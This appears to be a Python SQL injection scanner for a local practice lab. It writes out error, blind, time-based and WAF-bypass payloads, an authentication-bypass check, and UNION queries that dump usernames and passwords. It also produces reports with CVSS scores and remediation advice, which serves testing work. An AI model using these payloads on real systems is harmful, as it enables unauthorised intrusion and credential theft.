#!/usr/bin/env python3
"""
SQL Injection Scanner
Detects error-based, boolean-based blind, and time-based blind SQLi across
GET parameters, POST forms, JSON API bodies, and HTTP headers.
"""

import argparse
import json
import os
import sys
import time
import urllib.parse
from datetime import datetime
from html import escape

import requests
requests.packages.urllib3.disable_warnings()

# Payloads

ERROR_PAYLOADS = [
    "'",
    "''",
    "`",
    '"',
    "\\",
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    ") OR ('1'='1",
    "admin'--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
]

BOOLEAN_PAIRS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("' AND 1=1--",  "' AND 1=2--"),
    ("1 AND 1=1",    "1 AND 1=2"),
    ("1' AND '1'='1","1' AND '1'='2"),
]

TIME_PAYLOADS = [
    "'; SELECT SLEEP(3)--",
    "1; SELECT SLEEP(3)--",
    "' OR SLEEP(3)--",
    "1 OR SLEEP(3)--",
    "'; WAITFOR DELAY '0:0:3'--",   # MSSQL
    "'; SELECT pg_sleep(3)--",       # PostgreSQL
    "1' AND SLEEP(3) AND '1'='1",
]

WAF_BYPASS_PAYLOADS = [
    "'/**/OR/**/'1'='1",
    "' /*!OR*/ '1'='1",
    "%27%20OR%20%271%27%3D%271",
    "' OR 0x313d31--",
    "';%00SELECT--",
    "' oR '1'='1",
    "' Or '1'='1",
]

DB_ERROR_SIGNATURES = {
    "SQLite":     ["sqlite3.OperationalError", "SQLite", "no such table", "syntax error"],
    "MySQL":      ["you have an error in your sql syntax", "mysql_fetch", "mysql_num_rows", "1064"],
    "MSSQL":      ["unclosed quotation mark", "mssql", "microsoft sql server", "syntax error converting"],
    "PostgreSQL": ["pg_query", "postgresql", "pg_exec", "unterminated quoted string"],
    "Oracle":     ["ora-", "oracle", "quoted string not properly terminated"],
}

EXTRACTION_QUERIES = {
    "sqlite": {
        "tables":  "' UNION SELECT group_concat(name),2,3,4 FROM sqlite_master WHERE type='table'--",
        "columns": "' UNION SELECT group_concat(sql),2,3,4 FROM sqlite_master WHERE type='table'--",
        "dump":    "' UNION SELECT group_concat(username||':'||password),2,3,4 FROM users--",
    },
    "mysql": {
        "tables":  "' UNION SELECT group_concat(table_name),2,3,4 FROM information_schema.tables WHERE table_schema=database()--",
        "dump":    "' UNION SELECT group_concat(username,0x3a,password),2,3,4 FROM users--",
    },
}

# Scanner core

class Finding:
    def __init__(self, target, param, technique, payload, evidence, db_type=None, extracted=None, cvss=None):
        self.target    = target
        self.param     = param
        self.technique = technique
        self.payload   = payload
        self.evidence  = evidence
        self.db_type   = db_type or "Unknown"
        self.extracted = extracted or []
        self.cvss      = cvss or {}
        self.timestamp = datetime.now().isoformat()

    def severity(self):
        score = self.cvss.get("base_score", 0)
        if score >= 9.0: return "Critical"
        if score >= 7.0: return "High"
        if score >= 4.0: return "Medium"
        return "Low"


class SQLiScanner:
    def __init__(self, timeout=8, delay=0, verbose=False):
        self.timeout  = timeout
        self.delay    = delay
        self.verbose  = verbose
        self.findings = []
        self.session  = requests.Session()
        self.session.headers["User-Agent"] = "Mozilla/5.0 (compatible; SQLiScanner/1.0)"

    def log(self, msg, level="INFO"):
        colours = {"INFO": "\033[94m", "WARN": "\033[93m", "CRIT": "\033[91m", "OK": "\033[92m", "DIM": "\033[2m"}
        reset = "\033[0m"
        c = colours.get(level, "")
        print(f"  {c}[{level}]{reset} {msg}")

    def _request(self, method, url, **kwargs):
        kwargs.setdefault("timeout", self.timeout)
        kwargs.setdefault("verify", False)
        kwargs.setdefault("allow_redirects", True)
        try:
            resp = self.session.request(method, url, **kwargs)
            return resp
        except requests.exceptions.Timeout:
            return None
        except requests.exceptions.RequestException:
            return None

    # Detection helpers

    def _fingerprint_db(self, text):
        low = text.lower()
        for db, sigs in DB_ERROR_SIGNATURES.items():
            for sig in sigs:
                if sig.lower() in low:
                    return db
        return None

    def _check_error(self, response):
        if response is None:
            return False, None
        body = response.text
        db = self._fingerprint_db(body)
        for db_name, sigs in DB_ERROR_SIGNATURES.items():
            for sig in sigs:
                if sig.lower() in body.lower():
                    return True, db_name
        return False, None

    def _cvss_score(self, technique, context):
        """
        Simplified CVSS 3.1 base scores.
        Error/boolean in a login form = authentication bypass risk = highest.
        Time-based = confirmed but no direct extraction = slightly lower.
        Header injection = lower access vector complexity.
        """
        scores = {
            ("error",   "login"):  {"base_score": 9.8, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"},
            ("boolean", "login"):  {"base_score": 9.8, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"},
            ("error",   "search"): {"base_score": 8.6, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L"},
            ("boolean", "search"): {"base_score": 7.5, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"},
            ("error",   "api"):    {"base_score": 8.6, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L"},
            ("error",   "header"): {"base_score": 7.2, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N"},
            ("time",    "any"):    {"base_score": 7.5, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"},
        }
        key = (technique, context)
        return scores.get(key) or scores.get((technique, "any")) or {"base_score": 6.5, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N"}

    # Extraction

    def _attempt_extraction(self, url, param, method, baseline_len):
        extracted = []
        db_lower  = "sqlite"  # lab is SQLite; scanner uses error fingerprint in production
        queries   = EXTRACTION_QUERIES.get(db_lower, {})
        for label, payload in queries.items():
            injected = {param: payload}
            resp = self._request(method, url, params=injected if method == "GET" else None,
                                 data=injected if method == "POST" else None)
            if resp and len(resp.text) != baseline_len and resp.status_code == 200:
                # Crude extraction — pull text between common delimiters
                text = resp.text
                extracted.append(f"{label}: (response length changed — data in body)")
        return extracted

    # Injection point tests

    def test_get_param(self, url, param):
        print(f"\n[*] GET parameter: {url} — param={param}")
        baseline = self._request("GET", url, params={param: "test"})
        if not baseline:
            self.log("No baseline response", "WARN")
            return

        # 1. Error-based
        for payload in ERROR_PAYLOADS:
            resp = self._request("GET", url, params={param: payload})
            triggered, db = self._check_error(resp)
            if triggered:
                self.log(f"Error-based SQLi — payload: {payload!r}  DB: {db}", "CRIT")
                f = Finding(url, param, "error-based", payload,
                            f"DB error signature ({db}) in response",
                            db_type=db,
                            cvss=self._cvss_score("error", "search"))
                self.findings.append(f)
                break

        # 2. Boolean-based blind
        for true_p, false_p in BOOLEAN_PAIRS:
            r_true  = self._request("GET", url, params={param: true_p})
            r_false = self._request("GET", url, params={param: false_p})
            if r_true and r_false:
                diff = abs(len(r_true.text) - len(r_false.text))
                if diff > 20:
                    self.log(f"Boolean-blind SQLi — true/false response diff={diff} bytes", "CRIT")
                    f = Finding(url, param, "boolean-based blind", true_p,
                                f"Response length differs by {diff} bytes between true/false conditions",
                                cvss=self._cvss_score("boolean", "search"))
                    self.findings.append(f)
                    break

        # 3. Time-based blind
        for payload in TIME_PAYLOADS:
            t0   = time.time()
            resp = self._request("GET", url, params={param: payload})
            elapsed = time.time() - t0
            if elapsed >= 2.5:
                self.log(f"Time-based blind SQLi — elapsed={elapsed:.1f}s  payload: {payload!r}", "CRIT")
                f = Finding(url, param, "time-based blind", payload,
                            f"Response delayed {elapsed:.1f}s (threshold: 2.5s)",
                            cvss=self._cvss_score("time", "any"))
                self.findings.append(f)
                break

        # 4. WAF bypass attempt
        for payload in WAF_BYPASS_PAYLOADS:
            resp = self._request("GET", url, params={param: payload})
            triggered, db = self._check_error(resp)
            if triggered:
                self.log(f"WAF bypass SQLi — payload: {payload!r}", "WARN")
                f = Finding(url, param, "waf-bypass (error-based)", payload,
                            "Error triggered via obfuscated payload (WAF evasion candidate)",
                            db_type=db,
                            cvss=self._cvss_score("error", "search"))
                self.findings.append(f)
                break

    def test_post_form(self, url, fields):
        print(f"\n[*] POST form: {url} — fields={list(fields.keys())}")
        for param in fields:
            baseline_data = dict(fields)
            baseline = self._request("POST", url, data=baseline_data)
            if not baseline:
                continue

            for payload in ERROR_PAYLOADS:
                data = dict(fields)
                data[param] = payload
                resp = self._request("POST", url, data=data)
                triggered, db = self._check_error(resp)
                if triggered:
                    self.log(f"Error-based SQLi in POST[{param}] — DB: {db}", "CRIT")
                    f = Finding(url, param, "error-based (POST)", payload,
                                f"DB error in POST parameter",
                                db_type=db,
                                cvss=self._cvss_score("error", "login"))
                    self.findings.append(f)
                    break

            # Auth bypass check
            bypass_payloads = ["admin'--", "' OR '1'='1'--", "' OR 1=1--"]
            for payload in bypass_payloads:
                data = dict(fields)
                data[param] = payload
                resp = self._request("POST", url, data=data)
                if resp and ("welcome" in resp.text.lower() or "successful" in resp.text.lower() or "dashboard" in resp.text.lower()):
                    self.log(f"Authentication bypass via POST[{param}]  payload: {payload!r}", "CRIT")
                    f = Finding(url, param, "authentication bypass (POST)", payload,
                                "Login succeeded without valid credentials",
                                cvss=self._cvss_score("boolean", "login"))
                    self.findings.append(f)
                    break

    def test_json_api(self, url, field, baseline_value="1"):
        print(f"\n[*] JSON API: {url} — field={field}")
        baseline = self._request("POST", url, json={field: baseline_value},
                                 headers={"Content-Type": "application/json"})
        if not baseline:
            self.log("No baseline response", "WARN")
            return

        for payload in ERROR_PAYLOADS + ["0 UNION SELECT 1,2,3,4--", "1 AND 1=2", "1 AND 1=1"]:
            resp = self._request("POST", url, json={field: payload},
                                 headers={"Content-Type": "application/json"})
            triggered, db = self._check_error(resp)
            if triggered:
                self.log(f"Error-based SQLi in JSON[{field}] — DB: {db}  payload: {payload!r}", "CRIT")
                f = Finding(url, field, "error-based (JSON)", payload,
                            f"DB error in JSON API field",
                            db_type=db,
                            cvss=self._cvss_score("error", "api"))
                self.findings.append(f)
                break

        # Boolean check via response length difference
        for true_p, false_p in [("1 AND 1=1", "1 AND 1=2")]:
            r_true  = self._request("POST", url, json={field: true_p},
                                    headers={"Content-Type": "application/json"})
            r_false = self._request("POST", url, json={field: false_p},
                                    headers={"Content-Type": "application/json"})
            if r_true and r_false:
                diff = abs(len(r_true.text) - len(r_false.text))
                if diff > 5:
                    self.log(f"Boolean-blind SQLi in JSON[{field}] — diff={diff}", "CRIT")
                    f = Finding(url, field, "boolean-based blind (JSON)", true_p,
                                f"JSON API response differs by {diff} bytes on true vs false condition",
                                cvss=self._cvss_score("boolean", "search"))
                    self.findings.append(f)
                    break

        # Data extraction
        extract_payload = "0 UNION SELECT id,username,password,role FROM users WHERE id=1--"
        resp = self._request("POST", url, json={field: extract_payload},
                             headers={"Content-Type": "application/json"})
        if resp and resp.status_code == 200:
            try:
                data = resp.json()
                if any(k in str(data).lower() for k in ["admin", "password", "secret"]):
                    self.log(f"Data extraction confirmed via JSON injection!", "CRIT")
                    extracted_vals = [f"Extracted: {json.dumps(data)}"]
                    if self.findings:
                        self.findings[-1].extracted = extracted_vals
            except Exception:
                pass

    def test_header_injection(self, url, header_name):
        print(f"\n[*] Header injection: {url} — header={header_name}")
        baseline = self._request("GET", url)
        if not baseline:
            self.log("No baseline response", "WARN")
            return

        for payload in ERROR_PAYLOADS + ["1.1.1.1' AND '1'='1", "1.1.1.1' OR '1'='1"]:
            resp = self._request("GET", url, headers={header_name: payload})
            triggered, db = self._check_error(resp)
            if triggered:
                self.log(f"Error-based SQLi in header [{header_name}] — DB: {db}", "CRIT")
                f = Finding(url, header_name, "error-based (HTTP header)", payload,
                            f"DB error triggered via {header_name} header",
                            db_type=db,
                            cvss=self._cvss_score("error", "header"))
                self.findings.append(f)
                break

        # Boolean check via response comparison
        r_true  = self._request("GET", url, headers={header_name: "1.1.1.1' AND '1'='1"})
        r_false = self._request("GET", url, headers={header_name: "1.1.1.1' AND '1'='2"})
        if r_true and r_false and r_true.status_code == r_false.status_code:
            diff = abs(len(r_true.text) - len(r_false.text))
            if diff > 5:
                self.log(f"Boolean-blind SQLi in header [{header_name}] — diff={diff}", "CRIT")
                f = Finding(url, header_name, "boolean-based blind (HTTP header)",
                            "1.1.1.1' AND '1'='1",
                            f"Header response differs by {diff} bytes on true vs false condition",
                            cvss=self._cvss_score("boolean", "search"))
                self.findings.append(f)

# Report generation

SEVERITY_COLOURS = {
    "Critical": "#c0392b",
    "High":     "#e67e22",
    "Medium":   "#f39c12",
    "Low":      "#27ae60",
}

REMEDIATION = {
    "error-based":                    "Use parameterised queries (prepared statements). Never interpolate user input into SQL strings.",
    "boolean-based blind":            "Use parameterised queries. Apply input validation and whitelist allowed characters.",
    "time-based blind":               "Use parameterised queries. Disable verbose error messages in production.",
    "authentication bypass (POST)":   "Use parameterised queries. Hash passwords with bcrypt. Never compare raw strings in SQL.",
    "error-based (POST)":             "Use parameterised queries for all POST form fields.",
    "error-based (JSON)":             "Validate and sanitise all JSON body fields. Use parameterised queries in API handlers.",
    "boolean-based blind (JSON)":     "Use parameterised queries in API handlers. Validate field types strictly (e.g. enforce integer IDs).",
    "error-based (HTTP header)":      "Never use HTTP header values directly in SQL queries. Validate IP format with a regex before use.",
    "boolean-based blind (HTTP header)": "Validate all header values before use. Use parameterised queries.",
    "waf-bypass (error-based)":       "Parameterised queries are the only reliable fix — WAF rules are insufficient on their own.",
}

FIXED_CODE = {
    "login":  ('# Vulnerable\ncursor.execute(f"SELECT * FROM users WHERE username=\'{username}\' AND password=\'{password}\'")',
               '# Fixed\ncursor.execute("SELECT * FROM users WHERE username=? AND password=?", (username, password))'),
    "search": ('# Vulnerable\ncursor.execute(f"SELECT * FROM products WHERE name LIKE \'%{q}%\'")',
               '# Fixed\ncursor.execute("SELECT * FROM products WHERE name LIKE ?", (f"%{q}%",))'),
    "api":    ('# Vulnerable\ncursor.execute(f"SELECT * FROM products WHERE id={product_id}")',
               '# Fixed\ncursor.execute("SELECT * FROM products WHERE id=?", (int(product_id),))'),
    "header": ('# Vulnerable\ncursor.execute(f"SELECT ... WHERE \'{client_ip}\'=\'{client_ip}\'")',
               '# Fixed\nimport re\nif not re.match(r"^[\\d\\.]+$", client_ip):\n    client_ip = "0.0.0.0"\ncursor.execute("SELECT ... WHERE ip=?", (client_ip,))'),
}

def _context_for_param(param):
    p = param.lower()
    if "user" in p or "pass" in p:    return "login"
    if "q" == p or "search" in p:     return "search"
    if "id" == p:                      return "api"
    if "forwarded" in p or "ip" in p: return "header"
    return "search"


def generate_html_report(findings, output_path, target_base):
    now  = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    rows = ""
    details = ""

    for i, f in enumerate(findings, 1):
        sev   = f.severity()
        col   = SEVERITY_COLOURS.get(sev, "#7f8c8d")
        rows += f"""
        <tr>
          <td>{i}</td>
          <td>{escape(f.param)}</td>
          <td>{escape(f.technique)}</td>
          <td><span style="color:{col};font-weight:bold">{sev}</span></td>
          <td>{f.cvss.get('base_score','N/A')}</td>
          <td>{escape(f.db_type)}</td>
          <td><a href="#finding-{i}">Detail</a></td>
        </tr>"""

        ctx    = _context_for_param(f.param)
        rem    = REMEDIATION.get(f.technique, "Use parameterised queries.")
        fix    = FIXED_CODE.get(ctx, ("", ""))
        extr   = "<br>".join(escape(e) for e in f.extracted) if f.extracted else "N/A"
        vector = f.cvss.get("vector", "N/A")

        details += f"""
        <div class="finding" id="finding-{i}">
          <h3>Finding {i} — {escape(f.technique)} in <code>{escape(f.param)}</code>
              <span class="badge" style="background:{col}">{sev}</span>
          </h3>
          <table class="meta">
            <tr><th>Target URL</th><td>{escape(f.target)}</td></tr>
            <tr><th>Parameter</th><td><code>{escape(f.param)}</code></td></tr>
            <tr><th>Technique</th><td>{escape(f.technique)}</td></tr>
            <tr><th>Payload</th><td><code>{escape(f.payload)}</code></td></tr>
            <tr><th>Evidence</th><td>{escape(f.evidence)}</td></tr>
            <tr><th>DB Fingerprint</th><td>{escape(f.db_type)}</td></tr>
            <tr><th>CVSS 3.1 Score</th><td>{f.cvss.get('base_score','N/A')} — <code>{escape(vector)}</code></td></tr>
            <tr><th>Timestamp</th><td>{f.timestamp}</td></tr>
            <tr><th>Data Extracted</th><td>{extr}</td></tr>
          </table>
          <h4>Business Impact</h4>
          <p>{_business_impact(f.technique)}</p>
          <h4>Remediation</h4>
          <p>{escape(rem)}</p>
          {"<h4>Vulnerable vs Fixed Code</h4><div class='code-compare'><pre class='vuln'>" + escape(fix[0]) + "</pre><pre class='fixed'>" + escape(fix[1]) + "</pre></div>" if fix[0] else ""}
        </div>"""

    total    = len(findings)
    critical = sum(1 for f in findings if f.severity() == "Critical")
    high     = sum(1 for f in findings if f.severity() == "High")

    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>SQL Injection Scan Report</title>
  <style>
    * {{ box-sizing: border-box; margin: 0; padding: 0; }}
    body {{ font-family: 'Segoe UI', Arial, sans-serif; background: #f0f2f5; color: #2c3e50; }}
    header {{ background: #1a252f; color: white; padding: 30px 40px; }}
    header h1 {{ font-size: 26px; margin-bottom: 6px; }}
    header p  {{ color: #95a5a6; font-size: 14px; }}
    .container {{ max-width: 1100px; margin: 30px auto; padding: 0 20px; }}
    .card {{ background: white; border-radius: 8px; padding: 25px; margin-bottom: 25px; box-shadow: 0 1px 4px rgba(0,0,0,.1); }}
    h2 {{ font-size: 18px; color: #1a252f; margin-bottom: 15px; border-bottom: 2px solid #3498db; padding-bottom: 8px; }}
    h3 {{ font-size: 15px; margin: 15px 0 10px; }}
    h4 {{ font-size: 13px; color: #7f8c8d; margin: 12px 0 5px; text-transform: uppercase; letter-spacing: .5px; }}
    .stats {{ display: flex; gap: 15px; flex-wrap: wrap; margin-bottom: 20px; }}
    .stat {{ background: #f8f9fa; border-radius: 6px; padding: 15px 20px; text-align: center; flex: 1; min-width: 100px; }}
    .stat .num {{ font-size: 32px; font-weight: bold; }}
    .stat .lbl {{ font-size: 12px; color: #7f8c8d; margin-top: 3px; }}
    .critical {{ color: #c0392b; }} .high {{ color: #e67e22; }} .total {{ color: #2980b9; }}
    table {{ width: 100%; border-collapse: collapse; font-size: 13px; }}
    th {{ background: #2c3e50; color: white; padding: 10px 12px; text-align: left; }}
    td {{ padding: 9px 12px; border-bottom: 1px solid #ecf0f1; }}
    tr:hover td {{ background: #f8f9fa; }}
    .finding {{ border-left: 4px solid #3498db; padding: 20px; margin-bottom: 20px; background: #fafafa; border-radius: 0 6px 6px 0; }}
    .badge {{ display: inline-block; padding: 2px 10px; border-radius: 12px; color: white; font-size: 12px; margin-left: 10px; }}
    .meta th {{ background: #ecf0f1; color: #2c3e50; width: 160px; }}
    code {{ background: #f1f2f6; padding: 2px 6px; border-radius: 3px; font-size: 12px; font-family: monospace; }}
    .code-compare {{ display: flex; gap: 15px; margin-top: 8px; }}
    pre {{ background: #2c3e50; color: #ecf0f1; padding: 12px; border-radius: 6px; font-size: 12px; overflow-x: auto; flex: 1; white-space: pre-wrap; }}
    pre.fixed {{ background: #1a5276; }}
    p {{ font-size: 13px; line-height: 1.6; color: #555; }}
    a {{ color: #2980b9; text-decoration: none; }}
    footer {{ text-align: center; color: #95a5a6; font-size: 12px; padding: 30px; }}
  </style>
</head>
<body>
<header>
  <h1>SQL Injection Scan Report</h1>
  <p>Target: {escape(target_base)} &nbsp;|&nbsp; Generated: {now}</p>
</header>
<div class="container">

  <div class="card">
    <h2>Executive Summary</h2>
    <div class="stats">
      <div class="stat"><div class="num total">{total}</div><div class="lbl">Total Findings</div></div>
      <div class="stat"><div class="num critical">{critical}</div><div class="lbl">Critical</div></div>
      <div class="stat"><div class="num high">{high}</div><div class="lbl">High</div></div>
      <div class="stat"><div class="num">{total - critical - high}</div><div class="lbl">Medium / Low</div></div>
    </div>
    <p>The target application at <strong>{escape(target_base)}</strong> was found to contain
    <strong>{total} SQL injection vulnerabilities</strong> across {len(set(f.target for f in findings))} endpoint(s).
    Vulnerabilities were identified across all four injection contexts tested: POST login form,
    GET query parameter, JSON API body, and HTTP request header. The presence of
    authentication bypass and data extraction capabilities elevates overall risk to
    <strong>{'Critical' if critical > 0 else 'High'}</strong>.
    Immediate remediation is required.</p>
  </div>

  <div class="card">
    <h2>Scope &amp; Methodology</h2>
    <p><strong>Scope:</strong> {escape(target_base)}</p>
    <p><strong>Techniques used:</strong> Error-based, boolean-based blind, time-based blind, WAF bypass (obfuscated payloads)</p>
    <p><strong>Injection contexts:</strong> GET parameter, POST form field, JSON API body, HTTP request header (X-Forwarded-For)</p>
    <p><strong>Tool:</strong> Custom Python scanner (sqli_scanner.py)</p>
  </div>

  <div class="card">
    <h2>Findings Summary</h2>
    <table>
      <tr><th>#</th><th>Parameter</th><th>Technique</th><th>Severity</th><th>CVSS</th><th>DB</th><th>Detail</th></tr>
      {rows}
    </table>
  </div>

  <div class="card">
    <h2>Detailed Findings</h2>
    {details}
  </div>

</div>
<footer>Generated by sqli_scanner.py &nbsp;|&nbsp; For authorised testing only</footer>
</body>
</html>"""

    with open(output_path, "w") as fh:
        fh.write(html)


def _business_impact(technique):
    impacts = {
        "authentication bypass (POST)":   "An attacker can log in as any user — including administrators — without knowing any password. This gives immediate full access to the application and all data it can reach.",
        "error-based":                     "Database error messages leak the DB engine, schema names, and query structure. This information directly accelerates further exploitation.",
        "boolean-based blind":             "An attacker can extract the entire database contents one bit at a time using automated tools (e.g. sqlmap). All stored user data, credentials, and business records are at risk.",
        "time-based blind":                "Confirms SQL injection where no output is reflected. An attacker with enough time can extract all data via timing differences.",
        "error-based (POST)":              "POST parameters are injectable, enabling both data extraction and potential authentication bypass across all form-based login flows.",
        "error-based (JSON)":              "API endpoints expose SQL injection. Automated API clients and integrations can exploit this at high speed without a browser.",
        "boolean-based blind (JSON)":      "All data accessible via this API endpoint can be exfiltrated. API consumers have no visibility that extraction is occurring.",
        "error-based (HTTP header)":       "HTTP headers are an often-overlooked injection vector. WAFs frequently do not inspect headers with the same rigour as form fields.",
        "boolean-based blind (HTTP header)": "Confirms header-based injection. Any data accessible to the backend query is extractable.",
        "waf-bypass (error-based)":        "Obfuscated payloads bypassed WAF-style filters, confirming that input sanitisation is insufficient as the sole defence.",
    }
    return impacts.get(technique, "SQL injection allows unauthorised access to the database, potentially exposing all stored data.")


def generate_json_report(findings, output_path, target_base):
    data = {
        "scan_time":   datetime.now().isoformat(),
        "total":       len(findings),
        "critical":    sum(1 for f in findings if f.severity() == "Critical"),
        "high":        sum(1 for f in findings if f.severity() == "High"),
        "findings": [
            {
                "target":    f.target,
                "param":     f.param,
                "technique": f.technique,
                "payload":   f.payload,
                "evidence":  f.evidence,
                "db_type":   f.db_type,
                "severity":  f.severity(),
                "cvss":      f.cvss,
                "extracted": f.extracted,
                "timestamp": f.timestamp,
            }
            for f in findings
        ],
    }
    with open(output_path, "w") as fh:
        json.dump(data, fh, indent=2)

# CLI

def parse_args():
    p = argparse.ArgumentParser(
        description="SQL Injection Scanner — tests GET, POST, JSON, and header injection points",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Scan the VulnShop lab (all injection points)
  python3 sqli_scanner.py --target http://127.0.0.1:5000 --full

  # Scan a single GET parameter
  python3 sqli_scanner.py --url http://127.0.0.1:5000/search --get-param q

  # Scan with verbose output and save reports
  python3 sqli_scanner.py --target http://127.0.0.1:5000 --full -v -o reports/
        """,
    )
    p.add_argument("--target",    metavar="URL",    help="Base URL for --full scan")
    p.add_argument("--url",       metavar="URL",    help="Single endpoint URL")
    p.add_argument("--get-param", metavar="PARAM",  help="GET parameter to test")
    p.add_argument("--full",      action="store_true", help="Run full scan of all known VulnShop endpoints")
    p.add_argument("--timeout",   type=int, default=8,  metavar="SEC", help="Request timeout (default: 8)")
    p.add_argument("--delay",     type=float, default=0, metavar="SEC", help="Delay between requests")
    p.add_argument("-o",          dest="output", metavar="DIR", default="reports", help="Output directory (default: reports/)")
    p.add_argument("-v",          dest="verbose", action="store_true", help="Verbose output")
    return p.parse_args()


def main():
    args   = parse_args()
    banner = r"""
  ___  ___  _    _   ___
 / __|/ _ \| |  (_) / __|  ___ __ _ _ _  _ _  ___ _ _
 \__ \ (_) | |__ _ _\__ \ / __/ _` | ' \| ' \/ -_) '_|
 |___/\__\_\____(_)|___/ \__\__,_|_||_|_||_\___|_|
  SQL Injection Scanner  |  github.com/Cletus-FTL30
"""
    print(banner)

    scanner = SQLiScanner(timeout=args.timeout, delay=args.delay, verbose=args.verbose)

    if args.full:
        if not args.target:
            print("[!] --full requires --target <base_url>")
            sys.exit(1)
        base = args.target.rstrip("/")
        print(f"[*] Full scan of {base}\n")

        scanner.test_post_form(f"{base}/login",
                               {"username": "admin", "password": "password"})
        scanner.test_get_param(f"{base}/search", "q")
        scanner.test_json_api(f"{base}/api/product", "id", baseline_value="1")
        scanner.test_header_injection(f"{base}/track", "X-Forwarded-For")

    elif args.url and args.get_param:
        scanner.test_get_param(args.url, args.get_param)

    else:
        print("[!] Specify --full --target <url>  or  --url <url> --get-param <param>")
        sys.exit(1)

    # Results
    print(f"\n{'='*60}")
    print(f"  Scan complete — {len(scanner.findings)} finding(s)")
    print(f"{'='*60}\n")

    if not scanner.findings:
        print("  No SQL injection vulnerabilities detected.\n")
        return

    os.makedirs(args.output, exist_ok=True)
    ts     = datetime.now().strftime("%Y%m%d_%H%M%S")
    h_path = os.path.join(args.output, f"sqli_report_{ts}.html")
    j_path = os.path.join(args.output, f"sqli_report_{ts}.json")
    target_base = args.target if args.full else args.url

    generate_html_report(scanner.findings, h_path, target_base)
    generate_json_report(scanner.findings, j_path, target_base)

    print(f"  HTML report : {h_path}")
    print(f"  JSON report : {j_path}\n")

    for i, f in enumerate(scanner.findings, 1):
        print(f"  [{i}] {f.severity():8s}  {f.technique:<35}  param={f.param}")
    print()


if __name__ == "__main__":
    main()
